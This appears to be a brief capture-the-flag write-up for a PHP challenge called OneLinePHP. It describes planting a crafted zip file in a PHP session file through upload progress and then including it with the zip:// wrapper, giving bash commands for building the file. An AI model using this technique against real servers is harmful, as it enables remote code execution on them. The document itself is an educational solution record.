#OneLinePHP

- According to PHPInfo, it supports zip URI. 
- Following old OneLinePHP blogs, we have to create a zip file in /tmp/sess_{session}
- ZIP spec allows that, so we just create a zip file, prepend upload_progress_ and fix offsets 

```bash
zip a.zip s.php
echo -n "upload_progress_" > f
cat f a.zip > b.zip
zip -F b.zip --out c.zip
```
Run solve.py and in another session load zip:///tmp/sess_pepega#s
